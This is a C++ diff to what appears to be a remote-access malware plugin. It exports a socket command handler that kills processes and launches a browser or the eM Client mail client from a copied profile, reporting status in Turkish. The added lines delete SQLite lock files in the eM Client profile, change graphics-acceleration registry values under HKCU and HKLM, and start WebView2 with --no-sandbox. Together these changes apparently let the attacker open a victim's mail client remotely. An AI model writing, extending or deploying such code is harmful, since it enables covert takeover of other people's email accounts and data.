@@ -690,6 +690,23 @@ static bool compress_buffer(const std::vector<unsigned char>& input, std::vector
     return false;
 }
 
+static void clean_sqlite_locks(const fs::path& dir) {
+    if (!fs::exists(dir)) return;
+    try {
+        for (const auto& entry : fs::recursive_directory_iterator(dir)) {
+            if (entry.is_regular_file()) {
+                wstring name = entry.path().filename().wstring();
+                if (name.size() >= 4) {
+                    wstring suffix4 = name.substr(name.size() - 4);
+                    if (_wcsicmp(suffix4.c_str(), L"-shm") == 0 || _wcsicmp(suffix4.c_str(), L"-wal") == 0) {
+                        fs::remove(entry.path());
+                    }
+                }
+            }
+        }
+    } catch (...) {}
+}
+
 static void kill_process_by_name(const wstring& exeName) {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return;
@@ -2372,6 +2389,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
+                    if (wRequestedPath == L"eM Client" && !profilePath.empty()) {
+                        clean_sqlite_locks(profilePath);
+                    }
+
                     send_status("Tarayıcı başlatılıyor...");
 
                     wstring args;
@@ -2515,9 +2536,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         bool isEMClient = (wRequestedPath == L"eM Client");
                         bool hasOldVal = false;
                         DWORD oldVal = 0;
+                        bool hasOldValLM = false;
+                        DWORD oldValLM = 0;
                         if (isEMClient) {
                             hasOldVal = read_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
                             write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", 1);
+                            hasOldValLM = read_registry_dword(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldValLM);
+                            write_registry_dword(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", 1);
                             SetEnvironmentVariableW(L"WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS", L"--disable-gpu --disable-gpu-compositing --force-cpu-draw --no-sandbox");
                         }
 
@@ -2541,6 +2566,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 write_registry_dword(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldVal);
                             } else {
                                 delete_registry_value(HKEY_CURRENT_USER, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration");
+                            }
+                            if (hasOldValLM) {
+                                write_registry_dword(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration", oldValLM);
+                            } else {
+                                delete_registry_value(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Avalon.Graphics", L"DisableHWAcceleration");
                             }
                             SetEnvironmentVariableW(L"WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS", NULL);
                         }
